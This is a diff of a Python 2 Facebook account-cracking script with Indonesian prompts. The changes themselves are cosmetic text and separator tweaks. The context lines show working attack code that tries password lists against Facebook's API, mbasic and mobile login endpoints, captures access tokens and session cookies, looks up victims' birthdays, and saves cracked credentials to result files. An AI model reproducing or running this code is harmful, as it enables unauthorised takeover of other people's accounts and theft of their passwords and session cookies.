@@ -593,7 +593,7 @@ class __crack__:
                     print '\n %s[%s×%s] kata sandi minimal 6 karakter'%(N,M,N)
                 else:
                     def __yan__(ysc=None): # ycs => Yayan sayang Cindy:3
-                        cin = raw_input('\n [*] method : ')
+                        cin = raw_input('\n [•] metode : ')
                         if cin == '':
                             print '\n %s[%s×%s] jangan kosong bro'%(N,M,N);self.__yan__()
                         elif cin == '1':
@@ -637,14 +637,14 @@ class __crack__:
                             hasil(ok,cp)
                         else:
                             print '\n %s[%s×%s] input yang bener'%(N,M,N);self.__yan__()
-                    print '\n [ pilih method login - silahkan coba satu² ]\n'
+                    print '\n [ pilih metode login - silahkan coba satu² ]\n'
                     print ' [%s01%s]. method API (cepat)'%(O,N)
                     print ' [%s02%s]. method mbasic (lambat)'%(O,N)
                     print ' [%s03%s]. method mobile (sangat lambat)'%(O,N)
                     __yan__(pwek.split(','))
                     break
         elif ___yayanganteng___ in ('T', 't'):
-            print '\n [ pilih method login - silahkan coba satu² ]\n'
+            print '\n [ pilih metode login - silahkan coba satu² ]\n'
             print ' [%s01%s]. method API (cepat)'%(O,N)
             print ' [%s02%s]. method mbasic (lambat)'%(O,N)
             print ' [%s03%s]. method mobile (sangat lambat)'%(O,N)
@@ -675,8 +675,8 @@ class __crack__:
                 loop +=1
                 self.__api__()
             if 'access_token' in response.text and 'EAAA' in response.text:
-                print '\r  %s[-->] %s|%s                 %s' % (H,user,pw,N)
-                wrt = ' [✓] %s|%s' % (user,pw)
+                print '\r  %s[-->]  %s•%s                 %s' % (H,user,pw,N)
+                wrt = ' [✓]  %s•%s' % (user,pw)
                 ok.append(wrt)
                 open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                 break
@@ -687,7 +687,7 @@ class __crack__:
                     cp_ttl = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,kontol)).json()['birthday']
                     month, day, year = cp_ttl.split('/')
                     month = bulan_ttl[month]
-                    print '\r  %s[-->] %s|%s|%s %s %s     %s' % (K,user,pw,day,month,year,N)
+                    print '\r  %s[-->]  %s•%s•%s %s %s     %s' % (K,user,pw,day,month,year,N)
                     wrt = ' [×] %s|%s|%s %s %s' % (user,pw,day,month,year)
                     cp.append(wrt)
                     open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
@@ -699,8 +699,8 @@ class __crack__:
                 except:
                     pass
 
-                print '\r  %s[-->] %s|%s                %s' % (K,user,pw,N)
-                wrt = ' [×] %s|%s' % (user,pw)
+                print '\r  %s[-->]  %s•%s                %s' % (K,user,pw,N)
+                wrt = ' [×]  %s•%s' % (user,pw)
                 cp.append(wrt)
                 open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                 break
@@ -726,8 +726,8 @@ class __crack__:
             b = ses.post("https://mbasic.facebook.com/login.php", data={"email": user, "pass": pw, "login": "submit"})
             if "c_user" in ses.cookies.get_dict().keys():
             	kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-                print '\r  %s[-->] %s|%s|%s                 %s' % (H,user,pw,kuki,N)
-                wrt = ' [✓] %s|%s|%s' % (user,pw,kuki)
+                print '\r  %s[-->]  %s•%s•%s                 %s' % (H,user,pw,kuki,N)
+                wrt = ' [✓]  %s•%s•%s' % (user,pw,kuki)
                 ok.append(wrt)
                 open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                 break
@@ -738,8 +738,8 @@ class __crack__:
                     cp_ttl = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,kontol)).json()['birthday']
                     month, day, year = cp_ttl.split('/')
                     month = bulan_ttl[month]
-                    print '\r  %s[-->] %s|%s|%s %s %s     %s' % (K,user,pw,day,month,year,N)
-                    wrt = ' [×] %s|%s|%s %s %s' % (user,pw,day,month,year)
+                    print '\r  %s[-->]  %s•%s•%s %s %s     %s' % (K,user,pw,day,month,year,N)
+                    wrt = ' [×]  %s•%s•%s %s %s' % (user,pw,day,month,year)
                     cp.append(wrt)
                     open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                     break
@@ -750,8 +750,8 @@ class __crack__:
                 except:
                     pass
 
-                print '\r  %s[-->] %s|%s                %s' % (K,user,pw,N)
-                wrt = ' [×] %s|%s' % (user,pw)
+                print '\r  %s[-->]  %s•%s                %s' % (K,user,pw,N)
+                wrt = ' [×]  %s•%s' % (user,pw)
                 cp.append(wrt)
                 open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                 break
@@ -777,8 +777,8 @@ class __crack__:
             b = ses.post("https://m.facebook.com/login.php", data={"email": user, "pass": pw, "login": "submit"})
             if "c_user" in ses.cookies.get_dict().keys():
             	kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-                print '\r  %s[-->] %s|%s|%s                 %s' % (H,user,pw,kuki,N)
-                wrt = ' [✓] %s|%s|%s' % (user,pw,kuki)
+                print '\r  %s[-->]  %s•%s•%s                 %s' % (H,user,pw,kuki,N)
+                wrt = ' [✓]  %s•%s•%s' % (user,pw,kuki)
                 ok.append(wrt)
                 open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                 break
@@ -789,8 +789,8 @@ class __crack__:
                     cp_ttl = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,kontol)).json()['birthday']
                     month, day, year = cp_ttl.split('/')
                     month = bulan_ttl[month]
-                    print '\r  %s[-->] %s|%s|%s %s %s     %s' % (K,user,pw,day,month,year,N)
-                    wrt = ' [×] %s|%s|%s %s %s' % (user,pw,day,month,year)
+                    print '\r  %s[-->]  %s•%s•%s %s %s     %s' % (K,user,pw,day,month,year,N)
+                    wrt = ' [×]  %s•%s•%s %s %s' % (user,pw,day,month,year)
                     cp.append(wrt)
                     open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                     break
@@ -801,8 +801,8 @@ class __crack__:
                 except:
                     pass
 
-                print '\r  %s[-->] %s|%s                %s' % (K,user,pw,N)
-                wrt = ' [×] %s|%s' % (user,pw)
+                print '\r  %s[-->]  %s•%s                %s' % (K,user,pw,N)
+                wrt = ' [×]  %s•%s' % (user,pw)
                 cp.append(wrt)
                 open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                 break
@@ -811,7 +811,7 @@ class __crack__:
         loop += 1
 
     def __pler__(self):
-        yan = raw_input('\n [*] method : ')
+        yan = raw_input('\n [•] metode : ')
         if yan == '':
             print '\n %s[%s×%s] jangan kosong bro'%(N,M,N);self.__pler__()
         elif yan in ('1', '01'):
